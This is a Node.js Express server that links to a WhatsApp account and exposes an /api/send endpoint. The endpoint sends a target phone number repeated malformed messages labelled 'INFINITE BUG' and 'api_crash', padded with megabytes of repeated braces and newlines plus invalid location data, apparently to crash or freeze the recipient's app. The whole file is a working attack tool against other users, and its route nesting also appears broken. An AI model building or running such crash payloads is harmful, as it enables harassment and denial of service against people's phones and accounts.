// --- Imports --- \\
import express from 'express';
import {
  makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
} from '@fizzxydev/baileys-pro';
import { Boom } from '@hapi/boom';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const filename = fileURLToPath(import.meta.url);
const dirname = path.dirname(filename);

let kunle;

// --- WhatsApp Connection --- \\
async function startSock(phoneNumber, code = 'GABIMARU') {
  const { state, saveCreds } = await useMultiFileAuthState('./dev_session');
  const { version } = await fetchLatestBaileysVersion();
  kunle = makeWASocket({
    version,
    printQRInTerminal: false,
    auth: state,
  });

  kunle.ev.on('creds.update', saveCreds);

  kunle.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(
        'connection closed due to',
        lastDisconnect?.error,
        ', reconnecting',
        shouldReconnect
      );
      if (shouldReconnect) startSock(phoneNumber, code);
    } else if (connection === 'open') {
      console.log('✅ WhatsApp connected!');
    } else if (connection === 'connecting' || qr) {
      try {
        const pairingCode = await kunle.requestPairingCode(phoneNumber, code);
        console.log(`📲 Pair this device using code: ${pairingCode}`);
      } catch (err) {
        console.error('❌ Error requesting pairing code:', err);
      }
    }
  });

  return kunle;
}

// --- Express App ---
const app = express();

// Serve homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(dirname, 'index.html'));
});

// API logic
async function api_infinity(target) {
  await kunle.relayMessage('status@broadcast', {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: '⏤💣⃟‌𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙀꙳𝘽𝙐𝙂‌‌⃟⏤‌‌@api_crash',
            format: 'DEFAULT',
          },
          nativeFlowResponseMessage: {
            name: 'galaxy_message',
            paramsJson: { ...{ repeat: 9999 }, version: 3 },
            nativeFlowMessage: {
              messageParamsJson: '\n'.repeat(10000),
            },
          },
        },
      },
    },
    { statusJidList: [target], additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }], }] }] },
  });
}

async function api_InvisibleFC(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: '⏤💣⃟‌𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙀꙳𝘽𝙐𝙂‌‌⃟⏤‌‌@api_crash‌',
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: '⏤💣⃟‌𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙀꙳𝘽𝙐𝙂‌‌⃟⏤‌‌@api_crash‌',
                address: '\u200D',
              },
            },
            body: {
              text: '⏤💣⃟‌𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙀꙳𝘽𝙐𝙂‌‌⃟⏤‌‌@api_crash‌',
            },
            nativeFlowMessage: {
              messageParamsJson: '{'.repeat(1000000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ['0@s.whatsapp.net'],
            },
          },
        },
      },
    };
    await kunle.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

// Session check
app.get('/api/session', (req, res) => {
  const exists = fs.existsSync('./dev_session/creds.json');
  res.send({ sessionExists: exists });
});

// Start pairing
app.get('/api/connect', async (req, res) => {
  const { number } = req.query;
  if (!number) return res.status(400).send('Missing ?number=');

  const sessionExists = fs.existsSync('./dev_session/creds.json');
// Check if session exists
if (sessionExists) {
  return res.send({ message: '✅ Session already exists. No need to pair again.' });
}

// Start socket connection
try {
  await startSock(number);
  res.send({ message: `📲 Pairing started for ${number}. Check logs for code.` });
} catch (err) {
  console.error('❌ Error during connection setup:', err);
  res.status(500).send({ error: 'Connection failed' });
}

// Send Bug
app.get('/api/send', async (req, res) => {
  const { target } = req.query;
  if (!target) {
    return res.status(400).send('Missing ?target=');
  }

  const jid = target + '@s.whatsapp.net';

  try {
    for (let i = 0; i < 5; i++) {
      await api_infinity(jid);
      await api_InvisibleFC(jid);
    }
    res.send({ success: true, sentTo: jid });
  } catch (err) {
    console.error('Error sending Api BUG:', err);
    res.status(500).send({ error: 'API BUG FAILED' });
  }
});

// Launch server
app.listen(3000, () => {
  console.log('🚀 Server ready at http://localhost:3000');
});